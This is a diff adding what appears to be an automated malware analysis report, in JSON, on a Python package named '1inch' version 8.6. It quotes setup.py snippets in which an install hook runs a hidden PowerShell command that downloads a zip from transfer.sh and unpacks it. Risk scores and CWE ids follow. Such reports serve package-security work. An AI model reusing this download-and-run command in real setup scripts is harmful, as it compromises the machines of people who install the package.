@@ -1,0 +1,39 @@
+{
+  "package_metadata": {
+    "name": "1inch",
+    "version": "8.6",
+    "author_email": ""
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_endpoints": [
+      "https://transfer.sh/W7c4KP/transfer.zip"
+    ],
+    "process_spawns": [
+      "subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)",
+      "powershell -command $ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri https://transfer.sh/W7c4KP/transfer.zip -OutFile $env:tmp/update.zip; Expand-Archive..."
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "setup.py",
+        "code_snippet": "    result = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)\n"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "    run(r\"powershell -command $ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri https://transfer.sh/W7c4KP/transfer.zip -OutFile $env:tmp/update.zip; Expand-Archiv...ver.pyw\")\n"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.9,
+    "risk_score": 0.85,
+    "confidence": 0.95,
+    "cwe_ids": [
+      "CWE-78",
+      "CWE-94",
+      "CWE-200"
+    ]
+  }
+}
